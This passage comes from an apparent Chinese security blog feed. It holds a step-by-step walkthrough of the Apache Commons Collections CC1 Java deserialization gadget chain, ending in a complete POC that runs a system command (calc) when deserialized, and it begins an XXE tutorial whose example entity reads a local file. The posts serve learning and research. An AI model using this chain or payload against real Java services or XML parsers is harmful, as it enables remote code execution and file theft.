然后我们对这个对象进行遍历，在遍历过程中我们可以调用setValue方法，而恰好又遇到了一个重写了setValue的父类，这个重写的方法刚好调用了checkSetValue方法，这样就形成了一个闭环</p><p><strong>追寻setValue，找到readObject()</strong></p><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">    <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现了readobject下调用了setvalue</p><p>由于memberValues可控，这样我们就可以传入自己需要的，然后实现setValue方法</p><p>但是这个类没有说明是不是public之类的，也就是我们只能在包里面进行diaoyong，要想在外部调用的话就必须使用反射</p><p>copy的粗略的代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">    <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">            <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">    HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>); <span class="comment">//给map一个键值对，方便遍历</span></span><br><span class="line"></span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取sun.reflect.annotation.AnnotationInvocationHandler类的Class对象</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取指定参数类型的构造函数Constructor对象，这里我们能获取到估计就是它的那个构造函数</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"><span class="comment">// 相当于提升自己权限，以便可以访问非公共构造函数</span></span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里第一个是参数是注解的类原型，第二个就是我们之前的类</span></span><br><span class="line"><span class="comment">// 使用newInstance()方法创建一个新的AnnotationInvocationHandler实例</span></span><br><span class="line"><span class="comment">// 传递Override.class和decorate两个参数给构造函数</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Override.class, transformedMap);</span><br><span class="line">serialize(o);  <span class="comment">//序列化</span></span><br><span class="line">unserialize(<span class="string">&quot;CC1.txt&quot;</span>); <span class="comment">//反序列化</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义序列化方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC1.txt&quot;</span>));</span><br><span class="line">   oos.writeObject(object);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义反序列化方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">   ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">   objectInputStream.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现没有弹出计算器</p><h1 id="解决三个问题"><a href="#解决三个问题" class="headerlink" title="解决三个问题"></a>解决三个问题</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Runtime是没有实现Serializable接口的，无法序列化</span><br><span class="line">2. AnnotationInvocationHandler中的readObject执行 memberValue.setValue需要绕过两if判断</span><br><span class="line">3. memberValue.setValue中的值无法控制</span><br></pre></td></tr></table></figure><h3 id="Runtime是没有实现Serializable接口的，无法序列化"><a href="#Runtime是没有实现Serializable接口的，无法序列化" class="headerlink" title="Runtime是没有实现Serializable接口的，无法序列化"></a>Runtime是没有实现Serializable接口的，无法序列化</h3><p>虽然Runtime是没有实现Serializable接口的，可以运用反射来获取它的原型类，它的原型类Class是存在serializable接口，可以序列化的</p><p>改成下面这种形式</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        Class rc=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);                 <span class="comment">//获取类原型</span></span><br><span class="line">        Method getRuntime= rc.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);    <span class="comment">//获取getRuntime方法，</span></span><br><span class="line">        Runtime r=(Runtime) getRuntime.invoke(<span class="literal">null</span>,<span class="literal">null</span>);    <span class="comment">//获取实例化对象，因为该方法为无参方法，所以全为null</span></span><br><span class="line">        Method exec=rc.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);        <span class="comment">//获取exec方法</span></span><br><span class="line">        exec.invoke(r,<span class="string">&quot;calc&quot;</span>);                                         <span class="comment">//实现命令执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改成这样也是可以执行命令的；但是问题又来了，上面一共执行了三次<code>transform</code>方法。但是<code>InvokerTransformer</code>类中只能执行一次<code>transform</code>方法；</p><p>这里又要介绍一个需要利用的类<code>ChainedTransformer</code>;可以看一下此类的构造方法和<code>transform</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//传递一个transformers方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//一个for循环，将上一个对象当作下一个函数执行，循环嵌套</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们利用chainedTransformer</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">     <span class="type">Class</span> <span class="variable">runtimeClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);  <span class="comment">//获取原型类</span></span><br><span class="line">     Transformer[] Transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">     &#125;;</span><br><span class="line">     <span class="comment">//调用含参构造器传入Transformer数组，然后调用transform方法，这里对象只需要传一个原始的Runtime就行，因为其他都是嵌套的。</span></span><br><span class="line">     ChainedTransformer chainedTransformer= <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line">     chainedTransformer.transform(Runtime.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样可以运行</p><h3 id="解决setValue-方法无法执行的原因"><a href="#解决setValue-方法无法执行的原因" class="headerlink" title="解决setValue()方法无法执行的原因"></a><strong>解决setValue()方法无法执行的原因</strong></h3><p>setValue()方法是在两个if语句下边</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/e333e860070dd6d46ab0d3bfcd2a90f.png"></p><p>所以我们需要绕过这两个if语句才能执行</p><p>第一个if就是判断类型要不为空</p><p>第二个if</p><p>memberType.isInstance(value) || value instanceof ExceptionProxy：表示 value 是 memberType 类型的实例，或者是 ExceptionProxy 类型。</p><p>!()：对整个条件取反。，如果 value 既不是 memberType 的实例，也不是 ExceptionProxy，条件为真，进入 if 块。</p><h3 id="解决无法控制setValue值的问题"><a href="#解决无法控制setValue值的问题" class="headerlink" title="解决无法控制setValue值的问题"></a><strong><strong>解决无法控制setValue值的问题</strong></strong></h3><p>处理完if发现传进去的参数我们不可控</p><p>这里需要借助另一个类ConstantTransformer；这个类非常有意思，构造方法传递什么值，transform就返回什么值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; annotationInvocationHandler = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationHandler.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandler.newInstance(Target.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;环境搭建不说了 网上很多优秀的文章教学&lt;/p&gt;
&lt;p&gt;先列出利用的链子然后我们需要倒着进行分析&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;sp</summary>
      
    
    
    
    <category term="java" scheme="https://gu0f3n.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://gu0f3n.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>xxe漏洞</title>
    <link href="https://gu0f3n.github.io/2025/03/10/xxe%E6%BC%8F%E6%B4%9E/"/>
    <id>https://gu0f3n.github.io/2025/03/10/xxe%E6%BC%8F%E6%B4%9E/</id>
    <published>2025-03-10T13:47:11.000Z</published>
    <updated>2025-03-20T10:13:17.972Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a><strong>XML基础</strong></h3><p><a href="https://so.csdn.net/so/search?q=XML%E6%96%87%E6%A1%A3&spm=1001.2101.3001.7020">XML文档</a>结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML申明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [  &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span>  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span>     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">head</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>大白话解释下</p><h3 id="大白话版XML基础讲解"><a href="#大白话版XML基础讲解" class="headerlink" title="大白话版XML基础讲解"></a><strong>大白话版XML基础讲解</strong></h3><hr><h4 id="1-XML是啥？"><a href="#1-XML是啥？" class="headerlink" title="1. XML是啥？"></a><strong>1. XML是啥？</strong></h4><p>XML全称<strong>可扩展标记语言</strong>，你可以把它理解成一种<strong>“纯文本版的数据收纳盒”</strong>。它的核心作用是<strong>存储和传输结构化的数据</strong>，比如商品信息、用户资料等。举个栗子🌰：</p><ul><li><strong>HTML</strong>（网页语言）：负责把数据排版成好看的页面，比如字体颜色、表格布局。</li><li><strong>XML</strong>：只关心数据本身长啥样，比如一个商品的名字、价格、库存量。</li></ul><blockquote><p>📌 <strong>关键特点</strong>：标签可以自定义（比如 <code>&lt;手机型号&gt;小米13&lt;/手机型号&gt;</code>），不像HTML只能用固定标签（如 <code>&lt;p&gt;</code>）</p><p><strong>1</strong></p><p><strong>3</strong></p><p><strong>5</strong></p><p>。</p></blockquote><hr><h4 id="2-XML长什么样？"><a href="#2-XML长什么样？" class="headerlink" title="2. XML长什么样？"></a><strong>2. XML长什么样？</strong></h4><p>XML文档就像<strong>家谱</strong>，必须有一个<strong>“老祖宗”根标签</strong>，其他标签层层嵌套。比如：</p><p>xml</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  <span class="comment">&lt;!-- 文档声明（告诉电脑这是XML） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">超市</span>&gt;</span>  <span class="comment">&lt;!-- 根标签 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">商品</span> <span class="attr">分类</span>=<span class="string">&quot;饮料&quot;</span>&gt;</span>  <span class="comment">&lt;!-- 子标签，带属性 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">名称</span>&gt;</span>可乐<span class="tag">&lt;/<span class="name">名称</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">价格</span>&gt;</span>3.5<span class="tag">&lt;/<span class="name">价格</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">库存</span>&gt;</span>100<span class="tag">&lt;/<span class="name">库存</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">商品</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">超市</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><?xml version="1.0" encoding="UTF-8"?>  <!-- 文档声明（告诉电脑这是XML） -->&lt;超市&gt;  <!-- 根标签 --><br>  &lt;商品 分类&#x3D;”饮料”&gt;  <!-- 子标签，带属性 --><br>&lt;名称&gt;可乐&lt;&#x2F;名称&gt;<br>&lt;价格&gt;3.5&lt;&#x2F;价格&gt;<br>&lt;库存&gt;100&lt;&#x2F;库存&gt;<br>  &lt;&#x2F;商品&gt;<br>&lt;&#x2F;超市&gt;</li></ul><hr><h4 id="3-XML的规矩（语法）"><a href="#3-XML的规矩（语法）" class="headerlink" title="3. XML的规矩（语法）"></a><strong>3. XML的规矩（语法）</strong></h4><p>3.XML的规矩 (语法)<br>1.严格大小写：<Price>和<price>是俩不同的标签，电脑会认错68。<br>2.不能瞎起名：<br>）×不能用数字开头（如1&lt;1号商品&gt;<br>·×不能有空格（如&lt;商品名称&gt;）<br>·×别用特殊符号（如：或-）<br>3.躲开特殊字符：比如&lt;要写成&amp;lt；，否则电脑会以为是新标签。<br>4.注释写法：<!--这是注释-->，不能嵌套。</p><hr><h4 id="4-XML能干啥用？"><a href="#4-XML能干啥用？" class="headerlink" title="4. XML能干啥用？"></a><strong>4. XML能干啥用？</strong></h4><p>1. </p><p>   传数据</p><p>   ：比如APP和服务器之间传订单信息，用XML打包数据，双方都能看懂</p><p>   <strong>3</strong></p><p>   <strong>7</strong></p><p>   。</p><p>2. </p><p>   当配置文件</p><p>   ：很多软件的设置文件（比如Java的Spring框架）用XML存参数</p><p>   <strong>3</strong></p><p>   <strong>8</strong></p><p>   。</p><p>3. </p><p>   小型数据库</p><p>   ：比如存几百本书的信息，方便随时读取</p><p>   <strong>3</strong></p><p>   <strong>4</strong></p><p>   。</p><p>4. </p><p>   规范数据格式</p><p>   ：比如电商平台要求所有商家用统一的XML格式上传商品</p><p>   <strong>4</strong></p><p>   <strong>7</strong></p><p>   。</p><hr><h4 id="5-举个实际例子"><a href="#5-举个实际例子" class="headerlink" title="5. 举个实际例子"></a><strong>5. 举个实际例子</strong></h4><p>假设你要用XML存学生信息：</p><p>xml</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">班级</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">学生</span> <span class="attr">学号</span>=<span class="string">&quot;001&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">姓名</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">姓名</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">年龄</span>&gt;</span>18<span class="tag">&lt;/<span class="name">年龄</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">成绩</span>&gt;</span>90<span class="tag">&lt;/<span class="name">成绩</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">学生</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">学生</span> <span class="attr">学号</span>=<span class="string">&quot;002&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">姓名</span>&gt;</span>李四<span class="tag">&lt;/<span class="name">姓名</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">年龄</span>&gt;</span>19<span class="tag">&lt;/<span class="name">年龄</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">成绩</span>&gt;</span>85<span class="tag">&lt;/<span class="name">成绩</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">学生</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">班级</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>根标签</strong>：<code>&lt;班级&gt;</code></li><li><strong>嵌套结构</strong>：每个学生信息包裹在 <code>&lt;学生&gt;</code> 里，属性 <code>学号</code> 区分不同学生</li></ul><p><strong>XML &#x3D; 自定义标签 + 结构化数据 + 严格语法</strong>。它像一张万能表格，能把杂乱的数据整理得井井有条，方便电脑和人一起看懂。学XML的重点是：<strong>标签别写错、属性加引号、结构要清晰</strong>！</p><h5 id="xml语言的格式"><a href="#xml语言的格式" class="headerlink" title="xml语言的格式"></a>xml语言的格式</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>   //xml的声明  </span><br><span class="line"> <span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file://d:/1.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span 